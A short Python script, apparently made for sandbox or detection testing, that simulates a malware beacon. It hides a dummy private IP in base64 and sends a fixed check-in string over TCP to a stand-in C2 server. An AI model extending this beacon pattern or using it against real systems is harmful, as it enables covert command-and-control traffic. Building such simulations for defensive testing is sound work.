import base64
import socket

def connect_to_c2():
    """Simulates basic communication with a Command and Control server."""
    # Obfuscated C2 details in base64
    b64_ip = "MTkyLjE2OC4xOTkuMjAw" # This decodes to 192.168.199.200 (a dummy IP)
    c2_port = 8443
    
    try:
        target_ip = base64.b64decode(b64_ip).decode('utf-8')
        print(f"Attemping to check in with C2: {target_ip}:{c2_port}")
        
        # Create and connect socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, c2_port))
        
        # Simulate check-in beacon
        # This will create a specific network packet signal
        beacon_data = "BEACON_ID:TEST_HOST_123|STATUS:READY"
        s.sendall(beacon_data.encode('utf-8'))
        
        # Close the connection
        s.close()
        print("Check-in attempt complete.")
    except socket.error as e:
        # Expected to fail in a disconnected sandbox
        print(f"C2 connection failed: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    connect_to_c2()